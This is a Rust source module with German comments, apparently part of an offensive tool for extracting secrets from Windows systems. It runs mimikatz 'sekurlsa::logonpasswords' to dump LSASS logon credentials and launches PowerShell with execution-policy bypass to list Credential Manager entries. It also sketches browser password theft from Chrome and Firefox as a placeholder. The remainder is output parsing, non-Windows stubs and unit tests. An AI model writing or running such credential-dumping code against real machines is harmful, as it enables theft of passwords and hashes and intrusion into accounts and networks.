//! Windows-Secrets-Extraktion: Credential Manager, LSASS, Browser, SSH.
//!
//! Nutzt mimikatz (LSASS-Dump) und PowerShell (Credential Manager, Browser).
//! Auf Nicht-Windows-Plattformen liefern die Funktionen leere Ergebnisse.

use serde::{Deserialize, Serialize};
#[cfg(target_os = "windows")]
use std::process::Stdio;
#[cfg(target_os = "windows")]
use tokio::process::Command;
use tracing::debug;
#[cfg(any(target_os = "windows", test))]
use tracing::warn;

use crate::error::WinError;

/// Extrahiertes Secret von einem Windows-System.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Secret {
    /// Typ des Secrets (z.B. "credential_manager", "lsass", "browser", "ssh_key").
    pub secret_type: String,
    /// Benutzername oder Ziel.
    pub target: String,
    /// Passwort oder Hash.
    pub value: String,
}

/// Extrahiere Credentials aus dem Windows Credential Manager via PowerShell.
///
/// # Rückgabe
/// Vektor der gefundenen Secrets (leer, wenn keine Rechte oder kein Windows).
#[cfg(target_os = "windows")]
pub async fn extract_credential_manager() -> Result<Vec<Secret>, WinError> {
    let script = r#"
        $creds = cmdkey /list | Out-String
        $matches = [regex]::Matches($creds, 'Target: (?<target>.+?)\r\n\s+Type: (?<type>.+?)\r\n\s+User: (?<user>.+)')
        $results = @()
        foreach ($m in $matches) {
            $results += [pscustomobject]@{
                secret_type = 'credential_manager'
                target = $m.Groups['target'].Value
                value = $m.Groups['user'].Value
            }
        }
        ConvertTo-Json -InputObject @($results)
    "#;
    let output = run_powershell(script).await?;
    parse_secrets_from_json(&output)
}

/// Extrahiere LSASS-Credentials via mimikatz.
#[cfg(target_os = "windows")]
pub async fn extract_lsass() -> Result<Vec<Secret>, WinError> {
    // mimikatz "sekurlsa::logonpasswords" — erfordert Administrator
    let output = run_mimikatz("sekurlsa::logonpasswords").await?;
    parse_lsass_output(&output)
}

/// Extrahiere Browser-Speicherte Daten (Chrome, Firefox) via PowerShell.
#[cfg(target_os = "windows")]
pub async fn extract_browser_credentials() -> Result<Vec<Secret>, WinError> {
    let script = r#"
        # Chrome: DPAPI-dekodierte Passwörter aus Local State + Login Data
        # Firefox: logins.json dekodieren
        # Platzhalter — konkrete Implementierung je nach Browser-Version
        ConvertTo-Json -InputObject @()
    "#;
    let output = run_powershell(script).await?;
    parse_secrets_from_json(&output)
}

/// Führe ein PowerShell-Skript aus und liefere die Ausgabe.
#[cfg(target_os = "windows")]
async fn run_powershell(script: &str) -> Result<String, WinError> {
    let output = Command::new("powershell.exe")
        .arg("-NoProfile")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-Command")
        .arg(script)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .await
        .map_err(|e| WinError::ToolMissing(e.to_string()))?;
    if !output.status.success() {
        let err = String::from_utf8_lossy(&output.stderr).to_string();
        warn!("PowerShell fehlgeschlagen: {err}");
        return Err(WinError::ToolFailed(
            output.status.code().unwrap_or(-1),
            err,
        ));
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// Führe mimikatz aus und liefere die Ausgabe.
#[cfg(target_os = "windows")]
async fn run_mimikatz(command: &str) -> Result<String, WinError> {
    let output = Command::new("mimikatz.exe")
        .arg(command)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .await
        .map_err(|e| WinError::ToolMissing(format!("mimikatz nicht gefunden: {e}")))?;
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// Parse LSASS-Ausgabe von mimikatz (Format: Benutzername : Passwort).
#[cfg(target_os = "windows")]
fn parse_lsass_output(output: &str) -> Result<Vec<Secret>, WinError> {
    let mut secrets = Vec::new();
    for line in output.lines() {
        if let Some(pos) = line.find(": ") {
            let user = line[..pos].to_string();
            let pass = line[pos + 2..].to_string();
            if !user.is_empty() && !pass.is_empty() {
                debug!("LSASS-Credential für {user}");
                secrets.push(Secret {
                    secret_type: "lsass".into(),
                    target: user,
                    value: pass,
                });
            }
        }
    }
    Ok(secrets)
}

/// Parse JSON-Secrets aus PowerShell-Ausgabe.
///
/// PowerShell serialisiert ein einzelnes Element als Objekt, mehrere als Array.
/// Beide Formen werden akzeptiert: das einzelne Objekt wird zu einer Liste mit
/// einem Eintrag. Nicht lesbarer Inhalt führt zu einer Warnung und einem leeren
/// Ergebnis — ein Fehler wäre falsch, weil die Extraktion den Vorgang nicht
/// abbrechen soll, sondern ein Ergebnis liefert.
///
/// Der Parser ist bewusst nicht nur unter Windows verfügbar: die Regel, wie
/// die PowerShell-Ausgabe zu lesen ist, wird ohne Windows-Zielsystem getestet.
#[cfg(any(target_os = "windows", test))]
fn parse_secrets_from_json(output: &str) -> Result<Vec<Secret>, WinError> {
    let trimmed = output.trim();
    if trimmed.is_empty() {
        return Ok(Vec::new());
    }
    match serde_json::from_str::<Vec<Secret>>(trimmed) {
        Ok(secrets) => Ok(secrets),
        Err(list_err) => match serde_json::from_str::<Secret>(trimmed) {
            // Ein einzelnes Credential: PowerShell liefert dafür ein Objekt.
            Ok(single) => Ok(vec![single]),
            Err(_) => {
                warn!("JSON-Ausgabe der Secret-Extraktion nicht lesbar: {list_err}");
                Ok(Vec::new())
            }
        },
    }
}

// --- Nicht-Windows-Plattformen: Stub-Implementierungen ---

/// Extrahiere Credentials aus dem Windows Credential Manager (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn extract_credential_manager() -> Result<Vec<Secret>, WinError> {
    debug!("Credential-Manager-Extraktion nur auf Windows verfügbar");
    Ok(Vec::new())
}

/// Extrahiere LSASS-Credentials via mimikatz (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn extract_lsass() -> Result<Vec<Secret>, WinError> {
    debug!("LSASS-Dump nur auf Windows verfügbar");
    Ok(Vec::new())
}

/// Extrahiere Browser-Speicherte Daten (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn extract_browser_credentials() -> Result<Vec<Secret>, WinError> {
    debug!("Browser-Credentials nur auf Windows verfügbar");
    Ok(Vec::new())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Ausgabe von `ConvertTo-Json` bei genau einem gespeicherten Credential:
    /// PowerShell serialisiert ein einzelnes Element als Objekt.
    const EIN_CREDENTIAL: &str = r#"{
        "secret_type": "credential_manager",
        "target": "\\\\host\\share",
        "value": "DOMAIN\\user"
    }"#;

    /// Ausgabe bei mehreren gespeicherten Credentials: ein Array.
    const MEHRERE_CREDENTIALS: &str = r#"[
        {"secret_type": "credential_manager", "target": "ziel-a", "value": "nutzer-a"},
        {"secret_type": "credential_manager", "target": "ziel-b", "value": "nutzer-b"}
    ]"#;

    #[test]
    fn ein_credential_liefert_eine_liste_mit_einem_eintrag() {
        let secrets = parse_secrets_from_json(EIN_CREDENTIAL).expect("kein Fehler");

        assert_eq!(secrets.len(), 1);
        assert_eq!(secrets[0].secret_type, "credential_manager");
        assert_eq!(secrets[0].target, r"\\host\share");
        assert_eq!(secrets[0].value, r"DOMAIN\user");
    }

    #[test]
    fn mehrere_credentials_liefern_ihre_liste() {
        let secrets = parse_secrets_from_json(MEHRERE_CREDENTIALS).expect("kein Fehler");

        assert_eq!(secrets.len(), 2);
        assert_eq!(secrets[0].target, "ziel-a");
        assert_eq!(secrets[1].target, "ziel-b");
        assert_eq!(secrets[1].value, "nutzer-b");
    }

    #[test]
    fn leere_ausgabe_liefert_keine_secrets() {
        let secrets = parse_secrets_from_json("  \n ").expect("kein Fehler");

        assert!(secrets.is_empty());
    }

    #[test]
    fn unlesbare_ausgabe_liefert_keine_secrets_statt_eines_fehlers() {
        let secrets = parse_secrets_from_json("kein json").expect("kein Fehler");

        assert!(secrets.is_empty());
    }
}
